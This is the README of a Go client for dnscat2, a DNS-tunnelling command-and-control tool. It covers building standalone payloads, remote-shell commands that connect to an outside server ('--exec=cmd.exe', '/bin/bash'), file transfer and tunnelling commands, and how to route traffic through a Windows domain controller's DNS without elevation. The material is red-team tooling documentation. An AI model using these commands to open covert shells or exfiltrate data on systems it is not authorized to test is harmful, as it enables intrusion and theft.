# dnscat2 Go Client

A Golang implementation of the dnscat2 client, fully compatible with the original Ruby server.

## Features

- ✅ Full protocol compatibility with dnscat2 server
- ✅ ECDH + Salsa20 + SHA3 encryption
- ✅ Command protocol (shell, exec, upload, download, tunnel)
- ✅ Multiple DNS record types (TXT, CNAME, MX, A, AAAA)
- ✅ Cross-platform (Windows, Linux, macOS)
- ✅ Single binary, no dependencies
- ✅ Windows DNS auto-detection via registry (domain-joined environments)

## Building

```bash
cd go-client
go build -o dnscat2 ./cmd/dnscat/
```

For smaller binaries:

```bash
go build -ldflags="-s -w" -o dnscat2 ./cmd/dnscat/
```

**Build standalone payloads with hardcoded config:** See [BUILD.md](BUILD.md)

## Usage

### Basic Usage

Connect to server with domain:

```bash
./dnscat2 example.com
```

Direct connection to server:

```bash
./dnscat2 --dns-server=192.168.1.2
```

With pre-shared secret:

```bash
./dnscat2 --dns-server=192.168.1.2 --secret=<secret>
```

### Common Options

| Option                | Description                            | Default      |
| --------------------- | -------------------------------------- | ------------ |
| `--dns-server=<host>` | DNS server IP address                  | System DNS (see below) |
| `--dns-port=<port>`   | DNS server port                        | 53           |
| `--dns-type=<types>`  | DNS record types (TXT,CNAME,MX,A,AAAA) | TXT,CNAME,MX |
| `--secret=<hex>`      | Pre-shared secret for authentication   | None         |
| `--no-encryption`     | Disable encryption                     | false        |
| `--delay=<ms>`        | Delay between packets                  | 1000         |
| `--packet-trace`      | Enable packet tracing                  | false        |
| `--console`           | Start console session                  | false        |
| `--exec=<cmd>`        | Execute command/shell                  | None         |
| `--ping`              | Ping mode                              | false        |

### Examples

**Interactive shell (Windows):**

```bash
dnscat2.exe --dns-server=192.168.1.2 --secret=<secret> --exec=cmd.exe
```

**Interactive shell (Linux):**

```bash
./dnscat2 --dns-server=192.168.1.2 --secret=<secret> --exec=/bin/bash
```

**Command session (default):**

```bash
./dnscat2 --dns-server=192.168.1.2 --secret=<secret>
```

**Ping test:**

```bash
./dnscat2 --dns-server=192.168.1.2 --ping
```

## Server Side

Start the dnscat2 server:

```bash
ruby dnscat2.rb --dns host=0.0.0.0,port=53,domain=example.com --secret=<secret>
```

Server commands:

- `windows` - List sessions
- `window -i <id>` - Interact with session
- `shell` - Spawn a shell
- `exec <command>` - Execute a command
- `download <file>` - Download file from client
- `upload <local> <remote>` - Upload file to client
- `listen <port>` - Create tunnel listener
- `ping` - Test connection

## Architecture

```
cmd/dnscat/                  - Main entry point
  ├── main.go                - CLI flags, session setup, DNS driver bootstrap
  ├── getdns_windows.go      - Windows DNS resolver: reads registry (build tag: windows)
  └── getdns_unix.go         - Unix DNS resolver: reads /etc/resolv.conf (build tag: !windows)
cmd/dnscat-service/          - Windows Service wrapper (platform-specific files use //go:build windows)
pkg/
  ├── protocol/              - dnscat2 protocol packets (SYN, MSG, FIN, ENC, PING)
  ├── crypto/                - Encryption layer (ECDH, Salsa20, SHA3)
  ├── session/               - Session state machine
  ├── controller/            - Session management
  ├── driver/                - Application drivers
  │   ├── console.go         - Console driver
  │   ├── exec.go            - Process execution driver
  │   ├── ping.go            - Ping driver
  │   └── command/           - Command protocol driver
  └── tunnel/
      └── dns/               - DNS tunnel transport
```

## Protocol Compatibility

This Go client is fully compatible with the official dnscat2 server:

- ✅ Protocol version matching
- ✅ Encryption negotiation (ECDH, Salsa20, SHA3)
- ✅ Pre-shared secret authentication
- ✅ Command protocol (all commands supported)
- ✅ DNS encoding/decoding

## Differences from C Client

1. **Better cross-platform support** - No need for Cygwin on Windows
2. **Single binary** - No external library dependencies
3. **Concurrent I/O** - Uses goroutines instead of select()
4. **Memory safety** - No buffer overflows or memory leaks
5. **Modern crypto** - Uses Go's standard crypto libraries

## Security Notes

- Always use `--secret` with a strong random hex string
- The secret must match on both client and server
- Without `--secret`, connections use SAS verification (less secure)
- Use `--no-encryption` only for testing/debugging

## DNS Server Resolution

When `--dns-server` is not specified, the client selects a DNS server as follows:

1. **`DefaultServer` build-time override** — if `-ldflags "-X main.DefaultServer=<ip>"` was set at compile time, that value is used directly and `getSystemDNS()` is **not called**.
2. **`--dns-server` flag at runtime** — overrides everything.
3. **`getSystemDNS()` (Windows)** — `collectDNSServers()` performs two passes over all TCP/IP interface GUIDs under `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\`:
   - Pass 1: collect all `NameServer` values (static DNS) across every interface GUID.
   - Pass 2: collect all `DhcpNameServer` values (DHCP-assigned DNS) across every interface GUID.
   - Results are de-duplicated; `0.0.0.0` entries are skipped.
   - The first entry from the combined list is returned.
4. **Fallback** — `8.8.8.8` if all of the above yield nothing.

| Platform | Source | Fallback |
|---|---|---|
| **Windows** | Pass 1: `NameServer` (static) across all interfaces; Pass 2: `DhcpNameServer` (DHCP) across all interfaces — de-duplicated, `0.0.0.0` skipped, first result returned | `8.8.8.8` |
| **Linux / macOS** | First `nameserver` entry in `/etc/resolv.conf` | `8.8.8.8` |

On domain-joined Windows machines the static `NameServer` typically contains the DC's IP (e.g. `10.12.10.10`), enabling **domain mode** tunneling through the internal DNS conditional forwarder without hardcoding an IP in the binary.

> **Note:** The registry key is readable by any user (standard `KEY_READ` ACL). No elevation required.

## Troubleshooting

**Connection fails:**

- Check DNS server is reachable: `nslookup example.com <dns-server>`
- Verify port 53 is not blocked
- Try different DNS types: `--dns-type=TXT` or `--dns-type=A`

**Secret mismatch:**

```
Their authenticator was wrong!
```

- Ensure both sides use the same `--secret` value
- Secret is case-sensitive hexadecimal

**Session closes immediately:**

- For interactive shells, use direct command: `--exec=cmd.exe` (not `--exec="echo cmd"` )
- Check server logs for errors

## Development

Run tests:

```bash
go test ./...
```

Build for multiple platforms:

```bash
# Linux
GOOS=linux GOARCH=amd64 go build -o dnscat2-linux ./cmd/dnscat/

# Windows
GOOS=windows GOARCH=amd64 go build -o dnscat2.exe ./cmd/dnscat/

# macOS
GOOS=darwin GOARCH=amd64 go build -o dnscat2-mac ./cmd/dnscat/
```

## License

See the main dnscat2 project LICENSE.md

## Credits

- Original dnscat2 by Ron Bowes (iagox86)
- Go implementation maintains protocol compatibility
- Based on the C client and Ruby server specifications
